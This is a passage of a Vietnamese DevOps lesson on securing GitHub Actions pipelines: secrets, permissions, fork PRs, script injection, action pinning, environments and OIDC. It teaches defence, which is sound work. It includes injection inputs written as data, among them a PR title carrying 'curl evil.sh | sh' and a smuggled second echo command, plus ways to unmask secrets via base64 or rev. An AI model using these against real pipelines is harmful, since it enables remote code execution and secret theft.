# 04. Secrets, quyền và môi trường triển khai — bảo mật pipeline

> ⏱️ ~3,5 giờ · Mức độ: 🟥 Bắt buộc (mục 4.9–4.10 🟨, 4.11 🟦) · Kiến thức cần có trước: [02. GitHub Actions cơ bản](02-github-actions-basics.md), [03. Build & push image lên GHCR](03-github-actions-docker-registry.md), [Docker 07 — Bảo mật](../04-DOCKER/07-docker-security.md)
> Môi trường: `[WSL]` Ubuntu 24.04 + Git · `[GitHub]` giao diện web của repo `taskhub` (public) · `[Runner]` máy ảo GitHub Actions `ubuntu-24.04`
> Phiên bản khi viết (kiểm tra 2026-10-31): `actions/checkout` v7.0.1, `aquasecurity/trivy-action` v0.36.0, các action khác xem [bảng phiên bản đã ghim](labs/reference/README.md)

## Mục lục

1. [Mục tiêu bài học](#1-mục-tiêu-bài-học)
2. [Tại sao DevOps Engineer cần kiến thức này?](#2-tại-sao-devops-engineer-cần-kiến-thức-này)
3. [Kiến thức nền tảng cần hiểu](#3-kiến-thức-nền-tảng-cần-hiểu)
4. [Giải thích chi tiết](#4-giải-thích-chi-tiết)
5. [Ví dụ thực tế](#5-ví-dụ-thực-tế)
6. [Sơ đồ kiến trúc](#6-sơ-đồ-kiến-trúc)
7. [Các câu lệnh cần biết](#7-các-câu-lệnh-cần-biết)
8. [Giải thích câu lệnh và tham số](#8-giải-thích-câu-lệnh-và-tham-số)
9. [Bài thực hành từng bước](#9-bài-thực-hành-từng-bước)
10. [Kết quả mong đợi](#10-kết-quả-mong-đợi)
11. [Các lỗi thường gặp](#11-các-lỗi-thường-gặp)
12. [Đọc log và xử lý lỗi](#12-đọc-log-và-xử-lý-lỗi)
13. [Câu hỏi kiểm tra kiến thức](#13-câu-hỏi-kiểm-tra-kiến-thức)
14. [Bài tập tự làm](#14-bài-tập-tự-làm)
15. [Tiêu chí đánh giá đã hiểu bài](#15-tiêu-chí-đánh-giá-đã-hiểu-bài)
- [Nguồn tham khảo](#nguồn-tham-khảo)

---

## 1. Mục tiêu bài học

Sau bài này, bạn có thể:

- Phân biệt **secret** (bí mật — giá trị nhạy cảm, được che trong log), **variable** (biến cấu hình — không nhạy cảm) và **`GITHUB_TOKEN`** (token tự động, sống trong một job).
- Giải thích được **cơ chế che secret trong log (masking)** hoạt động thế nào và **vì sao nó không đáng tin tuyệt đối**.
- Viết khối `permissions:` theo **nguyên tắc quyền tối thiểu** (least privilege) ở cấp workflow và cấp job.
- Nhận ra hai lỗ hổng phổ biến nhất của workflow: **script injection** (chèn lệnh qua dữ liệu người dùng) và **`pull_request_target` chạy code lạ**.
- Giải thích **tấn công chuỗi cung ứng** (supply chain attack) qua action bên thứ ba bằng hai sự cố có thật (2025, 2026), và tự **ghim action bằng SHA commit đầy đủ**, kể cả với tag có chú thích.
- Cấu hình **Dependabot** để cập nhật action đã ghim, và **Environment** `production` có người duyệt.
- Mô tả được ý tưởng **OIDC** — vì sao pipeline v3 sẽ lên AWS mà **không lưu access key nào**.

---

## 2. Tại sao DevOps Engineer cần kiến thức này?

Pipeline CI/CD là nơi **tập trung nhiều quyền nhất** trong cả hệ thống: nó đọc được toàn bộ code, đẩy được image lên registry, và từ tuần 13 sẽ deploy được lên AWS. Kẻ tấn công không cần hack server production nếu chiếm được pipeline.

| Tình huống thật | Kiến thức trong bài |
|---|---|
| Pipeline cần mật khẩu registry, token Slack, quyền AWS | Secrets, environment, OIDC |
| Một action bên thứ ba bị chiếm quyền, in toàn bộ secret ra log công khai | Ghim SHA, quyền tối thiểu, xoay vòng secret |
| Người lạ mở Pull Request vào repo public của bạn | `pull_request` vs `pull_request_target`, secret không truyền cho fork |
| Tiêu đề PR chứa `"; curl evil.sh \| sh; "` | Script injection |
| "Deploy production phải có người bấm duyệt" | Environment + required reviewers |
| Phỏng vấn: "Bạn bảo vệ secret trong CI thế nào?" | Toàn bộ bài |

Đây là phần **"Security lồng vào từng giai đoạn"** đã thống nhất trong [lộ trình](../00-ROADMAP/learning-roadmap.md). Module 10 sẽ tổng hợp lại, nhưng thói quen phải hình thành **ngay từ workflow đầu tiên**.

---

## 3. Kiến thức nền tảng cần hiểu

### 3.1. Credential là gì, vì sao "đừng để lộ" chưa đủ

**Credential** (thông tin xác thực) là bất cứ thứ gì chứng minh "tôi được phép": mật khẩu, token, private key, access key. Ba câu hỏi luôn phải trả lời được cho mỗi credential:

1. **Ai/cái gì dùng nó?** (một job cụ thể, hay mọi workflow?)
2. **Nó làm được gì?** (chỉ đọc package, hay xóa được repo?)
3. **Nó sống bao lâu?** (1 giờ, hay vô thời hạn cho tới khi có người nhớ ra mà thu hồi?)

Credential tốt nhất là credential **phạm vi hẹp, sống ngắn, tự hết hạn**. `GITHUB_TOKEN` và OIDC (mục 4.4, 4.10) được thiết kế theo đúng hướng này; personal access token (PAT) dài hạn thì ngược lại.

### 3.2. Mô hình đe dọa của một pipeline

Như ở [Docker 07](../04-DOCKER/07-docker-security.md), trước khi chọn biện pháp, hãy liệt kê **ai có thể khiến code chạy trong pipeline của bạn**:

| Nguồn code chạy trong job | Ai kiểm soát | Rủi ro |
|---|---|---|
| File workflow `.github/workflows/*.yml` | Người có quyền ghi repo (bạn) | Thấp — nếu `main` được bảo vệ |
| Code của PR từ **fork** | **Bất kỳ ai** trên Internet (repo public) | Cao — code lạ |
| Action bên thứ ba (`uses: owner/repo@...`) | **Người bảo trì action đó** | Trung bình–cao — họ có thể bị hack |
| Thư viện Maven, base image | Người bảo trì thư viện/image | Trung bình (Module 10) |
| Dữ liệu sự kiện: tiêu đề PR, tên nhánh, nội dung comment | **Bất kỳ ai** | Cao — nếu bị chèn thẳng vào script |

Mỗi biện pháp trong bài chặn một dòng của bảng này.

### 3.3. Runner hosted dùng một lần

Mỗi job trên runner GitHub-hosted chạy trong **một máy ảo mới**, bị hủy khi job xong ([02. GitHub Actions cơ bản](02-github-actions-basics.md)). Điều này giúp rất nhiều: không có rác hay mã độc tồn tại từ job trước. Nhưng **trong khi job chạy**, mọi bước (kể cả action bên thứ ba) chạy cùng user, cùng filesystem, cùng biến môi trường. Một bước độc hại đọc được mọi thứ mà các bước khác trong **cùng job** có. Ranh giới bảo mật thật sự là **job**, không phải step.

---

## 4. Giải thích chi tiết

### 4.1. 🟥 Secrets: ba cấp, cách dùng đúng

**Secret** là giá trị được mã hóa, lưu trên GitHub, đưa vào job khi chạy và **được che (`***`) trong log**.

| Cấp | Tạo ở đâu | Ai dùng được |
|---|---|---|
| **Repository** | Repo → **Settings** → **Secrets and variables** → **Actions** | Mọi workflow trong repo |
| **Environment** | Repo → **Settings** → **Environments** → chọn môi trường | Chỉ job khai báo `environment: <tên>` — và chỉ **sau khi** qua luật bảo vệ (mục 4.9) |
| **Organization** | Cài đặt của organization | Các repo được chọn (repo cá nhân của bạn chưa dùng tới) |

Trùng tên ở nhiều cấp → **cấp thấp hơn thắng**: environment > repository > organization.

Giới hạn theo tài liệu GitHub (kiểm tra 2026-10-31): tối đa **100 secret/repo**, **100 secret/environment**, mỗi secret **≤ 48 KB**. Tên chỉ gồm chữ, số, `_`; không bắt đầu bằng số; **không bắt đầu bằng `GITHUB_`**.

**Cách dùng đúng: qua `env`, rồi dùng như biến shell có ngoặc kép.**

```yaml
- name: Gọi API
  env:
    API_TOKEN: ${{ secrets.API_TOKEN }}
  run: |
    curl -fsS -H "Authorization: Bearer $API_TOKEN" https://api.example.com/ping
```

> Vì sao `run: |` mà không viết trên một dòng? Lệnh chứa `: ` (sau `Authorization`). Trong YAML, giá trị không có nháy bao ngoài mà chứa `: ` là **lỗi cú pháp** → GitHub báo *Invalid workflow file*. Khối `|` coi mọi thứ bên dưới là văn bản thuần (xem bẫy YAML ở [bài 02](02-github-actions-basics.md)).

Ba quy tắc rút ra từ tài liệu:

1. **Secret chỉ vào job khi bạn gọi tên nó.** Workflow không tự có mọi secret của repo trong môi trường.
2. **Không dùng `secrets.*` trực tiếp trong `if:`.** GitHub không cho phép. Muốn kiểm tra "secret đã được cấu hình chưa", gán nó vào `env` cấp job rồi kiểm tra `env.TEN_BIEN != ''`.
3. **Secret chưa tạo = chuỗi rỗng, không báo lỗi.** Gõ sai tên (`secrets.API_TOKN`) thì workflow vẫn chạy, chỉ là lệnh nhận chuỗi rỗng → lỗi 401 khó hiểu ở bước sau. Hãy kiểm tra sớm (Bài tập 2).

**Khi nào secret KHÔNG được truyền vào job:**

| Tình huống | Secret có không? | Ghi chú |
|---|---|---|
| Workflow kích hoạt bởi PR **từ fork** (sự kiện `pull_request`) | ❌ (trừ `GITHUB_TOKEN`, chỉ đọc) | Người lạ không thể lấy secret bằng cách mở PR sửa workflow |
| Workflow kích hoạt bởi **Dependabot** | ❌ secret Actions thường | Dependabot có kho secret riêng (**Dependabot secrets**). CI của `taskhub` không cần secret nên không bị ảnh hưởng |
| Job không khai báo `environment:` | ❌ secret của environment | Chỉ có secret cấp repo |

### 4.2. 🟥 Masking — che secret trong log, và giới hạn của nó

Khi job chạy, runner biết giá trị của mọi secret được dùng. Trước khi ghi log, nó **tìm đúng chuỗi đó và thay bằng `***`**. Đó là toàn bộ cơ chế: **so khớp chuỗi**.

Hệ quả:

| Bạn làm | Log hiện | Vì sao |
|---|---|---|
| `echo "$DEMO_TOKEN"` | `***` | Khớp chuỗi gốc |
| `echo "$DEMO_TOKEN" \| rev` | chuỗi **đảo ngược, rõ ràng** | Chuỗi đã biến đổi không còn khớp |
| `echo "$DEMO_TOKEN" \| base64` | chuỗi base64 **rõ ràng** | Như trên — base64 giải mã được ngay |
| Secret là JSON nhiều dòng, in một trường | Có thể lộ | Tài liệu khuyên **không dùng dữ liệu có cấu trúc** làm giá trị secret |
| `set -x` trong script dùng secret | Thường bị che, nhưng phụ thuộc chuỗi có bị tách/ghép không | Đừng bật `set -x` ở bước có secret |

Tài liệu bảo mật của GitHub nói rõ: nếu bạn **tạo ra giá trị nhạy cảm mới từ secret** (ví dụ một JWT ký bằng private key, hoặc bản base64 của secret), phải **đăng ký nó là secret** để được che:

```bash
jwt="$(./make-jwt.sh)"          # giá trị mới sinh ra trong job
echo "::add-mask::$jwt"         # từ giờ chuỗi này cũng bị thay bằng ***
```

> ⚠️ **Masking là lưới an toàn cuối cùng, không phải biện pháp chính.** Một action độc hại không cần in secret ra log: nó **gửi thẳng về server của kẻ tấn công** qua mạng. Biện pháp chính là: secret chỉ có ở job thật sự cần, quyền token tối thiểu, và chỉ chạy code đáng tin (mục 4.5–4.7).

### 4.3. 🟥 Variables — cấu hình không nhạy cảm

**Variable** (`vars.*`) tạo ở cùng trang **Secrets and variables → Actions**, tab **Variables**. Khác secret ở hai điểm: **không bị che trong log** và **đọc lại được** trên giao diện.

```yaml
env:
  DEPLOY_TARGET: ${{ vars.DEPLOY_TARGET }}   # ví dụ: "ec2-ap-southeast-1"
```

| Loại giá trị | Đặt ở đâu |
|---|---|
| Mật khẩu, token, private key, access key | **Secret** |
| Tên region, tên image, URL môi trường, cờ bật/tắt | **Variable** (hoặc ghi thẳng trong YAML nếu không đổi theo môi trường) |
| Mật khẩu PostgreSQL **tạm** trong CI ([ci.yml tham khảo](labs/reference/workflows/ci.yml)) | Ghi thẳng trong YAML — database dùng một lần, không bảo vệ dữ liệu thật nào |

Dòng cuối thường gây tranh cãi trong review. Lập luận: một "secret" chỉ đáng bảo vệ khi lộ nó thì **có thứ gì bị mất**. `ci-only-password` mở khóa một PostgreSQL rỗng, chỉ nghe trong runner, bị hủy sau vài phút. Biến nó thành secret không tăng bảo mật mà còn làm PR từ fork không chạy được test. Ngược lại, mật khẩu PostgreSQL **trên EC2** (v2) tuyệt đối là secret.

### 4.4. 🟥 `GITHUB_TOKEN` và khối `permissions:`

Mỗi khi một **job** bắt đầu, GitHub tự tạo một token riêng cho job đó: `secrets.GITHUB_TOKEN` (hoặc `github.token`). Theo tài liệu GitHub:

- Token **hết hạn khi job kết thúc** (tối đa 6 giờ trên runner GitHub-hosted).
- Token chỉ có quyền trên **chính repo chứa workflow**.
- Repo mới tạo trong tài khoản cá nhân: mặc định token **chỉ đọc** `contents` và `packages` (thiết lập ở **Settings → Actions → General → Workflow permissions**).

Bạn thu hẹp hoặc mở rộng quyền bằng khối `permissions:`:

```yaml
permissions:            # cấp workflow: mặc định cho MỌI job
  contents: read

jobs:
  image:
    permissions:        # cấp job: THAY THẾ hoàn toàn khối cấp workflow cho job này
      contents: read
      packages: write
```

Ba quy tắc quan trọng:

1. **Khai báo bất kỳ quyền nào → mọi quyền không ghi ra trở thành `none`.** Vì vậy job `image` trong [ci.yml tham khảo](labs/reference/workflows/ci.yml) phải ghi lại `contents: read` — nếu chỉ ghi `packages: write`, bước checkout sẽ không đọc được code.
2. **Khối cấp job thay thế, không cộng dồn** với khối cấp workflow.
3. **`permissions: {}`** = token không có quyền gì (trừ metadata). Dùng cho job không cần chạm vào GitHub (ví dụ chỉ chạy lint trên code đã có).

Bảng quyền dùng trong `taskhub`:

| Workflow / job | Quyền | Vì sao |
|---|---|---|
| `CI` / `build-test` | `contents: read` | Chỉ checkout và chạy Maven |
| `CI` / `image` | `contents: read`, `packages: write` | Push image `:<sha7>` lên GHCR khi có push vào `main` |
| `Release` / `promote` | `contents: write`, `packages: write` | Tạo GitHub Release, gắn thêm tag `:vX.Y.Z` |
| v3 (tuần 13) / deploy | `contents: read`, `id-token: write` | Xin token OIDC để vào AWS (mục 4.10) |

**Một hành vi hay gây bối rối:** sự kiện do `GITHUB_TOKEN` tạo ra **không kích hoạt workflow mới** (trừ `workflow_dispatch`, `repository_dispatch`; PR mở bằng token thì tạo lần chạy cần duyệt). Đây là cơ chế chống vòng lặp vô hạn. Ví dụ: job `promote` tạo GitHub Release bằng `gh release create` — nếu bạn có workflow `on: release`, nó **sẽ không chạy**. Đây không phải lỗi.

### 4.5. 🟥 PR từ fork: `pull_request` và `pull_request_target`

Repo `taskhub` là **public**. Bất kỳ ai cũng có thể fork và mở PR. Workflow `on: pull_request` khi đó chạy **code của người lạ** (họ sửa được cả `pom.xml`, test, thậm chí file workflow trong PR). GitHub bảo vệ bạn bằng cách cho lần chạy đó:

- **Không có secret** nào (trừ `GITHUB_TOKEN`), và token **chỉ đọc**.
- Với người đóng góp lần đầu, lần chạy **chờ chủ repo bấm duyệt** (tùy thiết lập repo).

Vì vậy CI của `taskhub` an toàn khi chạy trên PR từ fork: nó không có gì để mất.

**`pull_request_target`** thì khác hoàn toàn: workflow chạy **trong ngữ cảnh của nhánh đích** (`main`), **có secret và token có quyền ghi**. Nó được thiết kế cho việc như gắn nhãn PR — **không chạm vào code của PR**. Lỗ hổng kinh điển:

```yaml
# ❌ NGUY HIỂM — đừng bao giờ viết thế này
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # checkout code của người lạ...
      - run: ./mvnw verify                                 # ...rồi chạy nó, trong khi có secret
```

Người lạ sửa `pom.xml` để thêm plugin chạy lệnh tùy ý → lệnh đó chạy với secret và token ghi của bạn. Tài liệu GitHub viết: workflow dùng các trigger này **không được checkout code không đáng tin, kể cả từ fork**, và **tránh dùng `pull_request_target` nếu không cần thiết**.

Từ **`actions/checkout` v7.0.0** (phát hành tháng 6/2026), action này **chặn checkout PR từ fork** khi chạy dưới `pull_request_target` và `workflow_run` (theo release notes). Đây là lớp bảo vệ thêm, không phải lý do để dùng `pull_request_target`.

**Quy tắc cho bạn:** dự án `taskhub` chỉ dùng `pull_request`, `push`, `workflow_dispatch`. Gặp `pull_request_target` trong repo công ty → đọc thật kỹ xem nó có checkout và chạy code PR không.

### 4.6. 🟥 Script injection — dữ liệu người dùng trở thành lệnh

Nhớ lại thứ tự xử lý ở [bài 02](02-github-actions-basics.md): GitHub **thay `${{ ... }}` bằng giá trị trước**, rồi mới đưa đoạn script cho bash chạy. Nếu giá trị đến từ người dùng, họ viết được **một phần script của bạn**.

```yaml
# ❌ Có lỗ hổng
- run: |
    echo "Tiêu đề PR: ${{ github.event.pull_request.title }}"
```

Ai đó mở PR với tiêu đề:

```text
demo"; echo "INJECTED-$((6*7))
```

Script bash thực sự được chạy trở thành:

```bash
echo "Tiêu đề PR: demo"; echo "INJECTED-$((6*7))"
```

→ in ra `INJECTED-42`. Thay `echo` bằng lệnh gửi `$GITHUB_TOKEN` ra ngoài là thành tấn công thật.

**Cách sửa (tài liệu GitHub khuyến nghị): đưa giá trị qua biến môi trường trung gian.**

```yaml
# ✅ An toàn
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Tiêu đề PR: $PR_TITLE"
```

Giá trị nằm trong **biến môi trường**, không còn là một phần của **mã nguồn script** → bash chỉ coi nó là dữ liệu. Nhớ đặt `"$PR_TITLE"` trong ngoặc kép.

Các giá trị **không đáng tin** cần cảnh giác: tiêu đề và nội dung PR/issue, nội dung comment, **tên nhánh** (`github.head_ref` — tên nhánh được phép chứa nhiều ký tự lạ), thông điệp commit, tên tác giả commit. Đó là lý do [release.yml tham khảo](labs/reference/workflows/release.yml) đưa cả `github.ref_name` qua `env: TAG` dù tag do chính bạn tạo: thói quen đúng thì không phải cân nhắc từng trường hợp.

🟨 `actionlint` (bạn đã dùng ở [bài 02](02-github-actions-basics.md)) có kiểm tra phát hiện biểu thức không đáng tin chèn thẳng vào `run:`.

### 4.7. 🟥 Chuỗi cung ứng: action bên thứ ba và ghim SHA

Khi viết `uses: docker/login-action@v4`, bạn đang nói: "chạy **bất kỳ code nào** mà tag `v4` của repo `docker/login-action` đang trỏ tới **vào lúc job chạy**". Như đã học ở [Git 05](../03-GIT/05-tags-releases-versioning.md), **tag Git có thể bị dời** bởi người có quyền ghi repo — hoặc bởi kẻ đã đánh cắp quyền đó.

**Hai sự cố có thật:**

| | `tj-actions/changed-files` (3/2025) | `aquasecurity/trivy-action` (19/3/2026) |
|---|---|---|
| Mã | CVE-2025-30066 | CVE-2026-33634 (GHSA-69fq-xp46-6x23) |
| Chuyện gì xảy ra | Kẻ tấn công sửa code action và **dời ngược nhiều tag phiên bản** sang một commit độc hại | Dùng credential bị đánh cắp, kẻ tấn công **force-push 76/77 tag** của `trivy-action` và **cả 7 tag** của `setup-trivy` sang commit độc hại; phát hành Trivy v0.69.4 độc hại |
| Mã độc làm gì | Đọc secret từ bộ nhớ process của runner và **in ra log** — repo public thì log ai cũng xem được | Đánh cắp credential của pipeline |
| Quy mô | Action được dùng trong hơn 23.000 repo (theo báo chí bảo mật) | Một trong những công cụ quét lỗ hổng phổ biến nhất |
| Ai thoát | Repo ghim action bằng SHA commit (trừ khi cập nhật vào SHA độc hại trong thời gian bị tấn công) | Advisory liệt kê bản an toàn: `trivy-action` **v0.35.0**, `setup-trivy` **v0.2.6**, Trivy **v0.69.2/v0.69.3** |
| Phải làm gì nếu bị ảnh hưởng | **Coi mọi secret pipeline đã lộ → xoay vòng (rotate) ngay**, kiểm tra log | Như bên trái, cộng kiểm tra log ngày 19–20/3/2026 |

Mỉa mai ở sự cố thứ hai: **chính công cụ bảo mật** trở thành đường tấn công. Không có action nào "đủ uy tín để khỏi phải ghim".

**Ghim bằng SHA commit đầy đủ (40 ký tự hex):**

```yaml
- uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0
```

SHA commit là **mã băm nội dung** ([Git 01](../03-GIT/01-git-fundamentals-internals.md)): không ai đổi được nội dung đằng sau nó mà không đổi chính SHA. Ghi chú `# v0.36.0` ở cuối dòng để người đọc biết đó là phiên bản nào — và Dependabot cập nhật luôn ghi chú này khi nó **nằm cùng dòng** (theo tài liệu bảo mật GitHub Actions).

**Lấy SHA thế nào — và cái bẫy của tag có chú thích:**

```bash
git ls-remote https://github.com/aquasecurity/trivy-action 'refs/tags/v0.36.0' 'refs/tags/v0.36.0^{}'
```

```text
a9c7b0f06e461e9d4b4d1711f154ee024b8d7ab8	refs/tags/v0.36.0
ed142fd0673e97e23eac54620cfb913e5ce36c25	refs/tags/v0.36.0^{}
```

(Kết quả thật khi kiểm tra ngày 2026-10-31.) Có **hai dòng** vì `v0.36.0` là **annotated tag** (tag có chú thích — đã học ở [Git 05](../03-GIT/05-tags-releases-versioning.md)): dòng đầu là SHA của **đối tượng tag**, dòng `^{}` là SHA của **commit** mà tag trỏ tới ("bóc" lớp tag ra). Bạn cần **SHA commit** (`ed142fd…`).

Với lightweight tag, chỉ có một dòng và đó chính là SHA commit:

```bash
git ls-remote https://github.com/actions/checkout 'refs/tags/v7.0.1' 'refs/tags/v7.0.1^{}'
```

```text
3d3c42e5aac5ba805825da76410c181273ba90b1	refs/tags/v7.0.1
```

**Giới hạn của ghim SHA — đọc kỹ:** SHA chỉ khóa **code của chính action đó**. Nếu bên trong nó lại gọi một action khác **theo tag**, hoặc tải binary "latest" từ Internet, phần đó vẫn có thể bị đổi. Advisory của Trivy liệt kê cả "SHA pin tới các commit trước 2025-04-09" trong phạm vi bị ảnh hưởng. Bài học: ghim SHA là **điều kiện cần**, kết hợp với quyền tối thiểu và secret chỉ ở job cần — không phải tấm khiên duy nhất.

**Dependabot giữ SHA luôn mới.** Ghim SHA mà không cập nhật thì bạn mắc kẹt với bản cũ có lỗi. File `.github/dependabot.yml` ([bản tham khảo](labs/reference/dependabot.yml)) với `package-ecosystem: github-actions`, `directory: /` (tài liệu yêu cầu đúng `/` để quét `.github/workflows`) → mỗi tuần Dependabot mở PR đổi SHA + ghi chú phiên bản. PR đó **phải qua CI** và **bạn đọc release notes** trước khi merge — đừng merge mù.

**🟨 Bắt buộc ghim ở cấp chính sách.** Từ 15/8/2025, GitHub có tùy chọn **"Require actions to be pinned to a full-length commit SHA"** ở **Settings → Actions → General**. Bật lên, mọi workflow dùng action không ghim SHA sẽ **thất bại khi chạy**. Áp dụng cho cả action của GitHub (`actions/*`).

**🟦 Mới: workflow lockfile.** Ngày 14/10/2026 GitHub đưa **workflow dependency lockfiles** vào public preview (gồm cả gói Free): file `.github/workflows/actions.lock` sinh bằng extension `gh actions-lock`, ghi lại commit của action **và các phụ thuộc bắc cầu** của nó. Tài liệu gọi đây là "biện pháp mạnh nhất, thay thế ghim SHA cho repo áp dụng nó". Vì còn preview, giáo trình dùng ghim SHA (mọi công cụ và mọi công ty đều hiểu). Theo dõi khi tính năng này chính thức.

### 4.8. 🟥 `persist-credentials: false`

Mặc định, `actions/checkout` **ghi token vào `.git/config`** của thư mục làm việc để các bước sau chạy được `git push`. Hệ quả: **mọi bước sau** trong job (kể cả action bên thứ ba, kể cả lệnh `mvn` chạy plugin) đọc được token đó trong file.

Pipeline `taskhub` không bao giờ `git push` từ CI → tắt đi:

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  with:
    persist-credentials: false
```

Quy tắc chung: **không để credential nằm lại lâu hơn và rộng hơn mức cần.**

### 4.9. 🟨 Environments — cổng duyệt trước khi deploy

**Environment** (môi trường triển khai) là một đối tượng trên GitHub đại diện cho nơi bạn deploy: `staging`, `production`. Job khai báo:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-24.04
    environment: production      # job phải qua luật bảo vệ của "production"
```

Environment cho bạn:

| Tính năng | Tác dụng |
|---|---|
| **Required reviewers** | Job dừng ở trạng thái *Waiting*, chỉ chạy khi một người được chỉ định bấm **Approve**. Tối đa 6 người/team |
| **Wait timer** | Chờ N phút trước khi chạy (1 → 43.200 phút = 30 ngày) |
| **Deployment branches and tags** | Chỉ nhánh/tag phù hợp được deploy vào môi trường này (ví dụ chỉ `main` hoặc tag `v*`) |
| **Environment secrets/variables** | Secret của `production` chỉ vào job đã qua cổng duyệt — job `build-test` không bao giờ thấy |
| **Lịch sử deploy** | Trang **Deployments** của repo ghi lại ai deploy gì, lúc nào |

**Gói GitHub Free** (theo tài liệu, kiểm tra 2026-10-31): required reviewers, wait timer và environment secrets **chỉ có cho repo public**. Repo private cần gói Pro/Team trở lên. `taskhub` là public nên dùng được hết.

🟨 Repo cá nhân, người duyệt là chính bạn. Đừng bật **"Prevent self-review"** nếu bạn là người duy nhất, nếu không sẽ không ai duyệt được. Giá trị của cổng duyệt ở đây là **dừng lại một nhịp** trước khi chạm production, và tạo **bản ghi** ai đã duyệt.

### 4.10. 🟨 OIDC — vào cloud mà không lưu access key (xem trước v3)

Cách cũ để GitHub Actions deploy lên AWS: tạo IAM user, sinh **access key dài hạn**, dán vào secret `AWS_SECRET_ACCESS_KEY`. Rủi ro: key sống vô thời hạn, lộ một lần là kẻ tấn công dùng được từ bất cứ đâu cho tới khi bị thu hồi.

**OIDC** (OpenID Connect) đảo ngược cách làm:

```text
1. Job (có permissions: id-token: write) xin GitHub một "giấy chứng nhận" ngắn hạn (JWT),
   ghi rõ: repo nào, nhánh/tag nào, environment nào.
2. Job đưa giấy đó cho AWS.
3. AWS đã được cấu hình tin GitHub và kiểm tra: "repo phuong-dev/taskhub, environment production?
   Đúng điều kiện trong IAM role → cấp credential tạm thời, chỉ dùng cho job này."
4. Hết job → credential hết hạn.
```

Theo tài liệu GitHub, lợi ích: **không cần lưu credential cloud dài hạn làm secret**, credential tạm **chỉ có hiệu lực cho một job**, và kiểm soát chi tiết workflow nào được lấy quyền gì. Bạn sẽ dựng thật ở dự án v3 (tuần 13), sau khi học IAM ở Module 06. Bây giờ chỉ cần trả lời được: "vì sao `taskhub` không có secret `AWS_SECRET_ACCESS_KEY`?"

### 4.11. 🟦 Secret scanning và push protection

Phòng tuyến **trước khi** secret vào được repo:

- **Push protection for users** — theo tài liệu GitHub, **bật mặc định** cho tài khoản của bạn: chặn bạn push secret được nhận diện (token GitHub, key AWS…) lên **repo public**.
- **Push protection cho repository** là thiết lập **riêng**, mặc định tắt, quản trị viên bật cho từng repo và cần GitHub Secret Protection.

Đây là lưới an toàn, không bắt được mọi định dạng (mật khẩu tự đặt như `taskhub123` thì không công cụ nào nhận ra). Module 10 sẽ thêm quét secret trong CI và quét lịch sử Git.

### 4.12. Gặp lại ở đâu

| Kiến thức | Gặp lại ở |
|---|---|
| Ghim SHA, Dependabot | [Dự án v1](../12-PRACTICAL-PROJECT/milestones/v1-ci.md) — điều kiện hoàn thành; Module 10 |
| `permissions`, `GITHUB_TOKEN` | [Bài 03](03-github-actions-docker-registry.md) (push GHCR), [lab release](labs/lab-02-release-ghcr.md) |
| Environment `production` | v3 (tuần 13) — deploy lên EC2 phải qua cổng duyệt |
| OIDC, `id-token: write` | Module 06 (IAM role) + v3 |
| Secret trên server | Module 06 — SSM Parameter Store/Secrets Manager; Module 09 — Kubernetes Secret |
| Xoay vòng secret khi lộ | Module 10, runbook sự cố trong v1.0 |

---

## 5. Ví dụ thực tế

### Ví dụ 1: Sáng thứ Hai, action bạn dùng lên báo

Tháng 3/2025, tin về `tj-actions/changed-files` lan khắp cộng đồng. Một team dùng `uses: tj-actions/changed-files@v45` trong 40 repo. Câu hỏi đầu tiên của trưởng nhóm: "Workflow nào của ta đã chạy action này trong khoảng thời gian bị tấn công, và job đó có những secret nào?". Repo nào ghi `@v45` → phải mở log từng lần chạy, liệt kê secret, xoay vòng hết. Repo nào ghim SHA cũ → không bị ảnh hưởng, chỉ cần xác nhận SHA không nằm trong danh sách độc hại. Khác biệt: vài phút so với vài ngày.

### Ví dụ 2: "Công cụ bảo mật" là cửa sau

Sự cố Trivy tháng 3/2026 cho thấy: một bước **quét lỗ hổng** thêm vào để tăng bảo mật lại là thứ đánh cắp credential. Bài học cho `taskhub`: job `image` có Trivy chạy **trước** bước đăng nhập GHCR; job `build-test` không có secret nào; workflow `CI` không có secret repo nào. Nếu Trivy (hoặc bất kỳ action nào) bị chiếm lần nữa, thứ nó lấy được rất ít.

### Ví dụ 3 (tình huống minh họa): debug làm lộ secret

Một kỹ sư không hiểu vì sao lệnh đăng nhập registry lỗi 401, bèn thêm bước debug `echo "$REGISTRY_PASSWORD" | base64` "cho chắc không bị che". Log của repo public ghi rõ chuỗi base64. Ba tuần sau, registry bị đẩy image lạ. Cách debug đúng: in **độ dài** (`echo "${#REGISTRY_PASSWORD}"`) hoặc kiểm tra **có rỗng không** — đủ để phát hiện secret chưa cấu hình mà không lộ gì.

---

## 6. Sơ đồ kiến trúc

### 6.1. Ranh giới tin cậy của pipeline `taskhub`

```text
                     Ai viết được code chạy ở đây?
┌──────────────────────────────────────────────────────────────────────────┐
│ PR từ fork (người lạ) ──► CI: build-test, image                           │
│                           token: chỉ đọc · secret: KHÔNG · push: KHÔNG     │
├──────────────────────────────────────────────────────────────────────────┤
│ Merge vào main (qua PR bạn đã review) ──► CI: image                       │
│                           token: packages:write · chỉ bước push dùng tới   │
├──────────────────────────────────────────────────────────────────────────┤
│ Tag v* (chỉ bạn) ──► Release: promote                                     │
│                           token: contents:write, packages:write            │
├──────────────────────────────────────────────────────────────────────────┤
│ v3: deploy ──► environment "production" ──[bạn bấm Approve]──► OIDC → AWS │
│                           token: id-token:write · secret production         │
└──────────────────────────────────────────────────────────────────────────┘
 Càng xuống dưới: càng nhiều quyền, càng ít người kích hoạt được.
```

### 6.2. `${{ }}` thẳng vào `run:` và qua `env:`

```text
❌ run: echo "${{ github.event.pull_request.title }}"
   GitHub thay chuỗi ──► script = echo "demo"; echo "INJECTED"   ──► bash chạy 2 lệnh

✅ env: { PR_TITLE: ${{ github.event.pull_request.title }} }
   run: echo "$PR_TITLE"
   GitHub đặt biến môi trường ──► script = echo "$PR_TITLE"       ──► bash in đúng 1 chuỗi
```

### 6.3. Tag di động và SHA cố định

```text
            tháng 2                     19/3/2026 (bị tấn công)
tag v0.34.2 ──► commit A (sạch)   ⇒    tag v0.34.2 ──► commit X (độc hại)
SHA A ──────► commit A (sạch)     ⇒    SHA A ──────► commit A (vẫn sạch)
```

---

## 7. Các câu lệnh cần biết

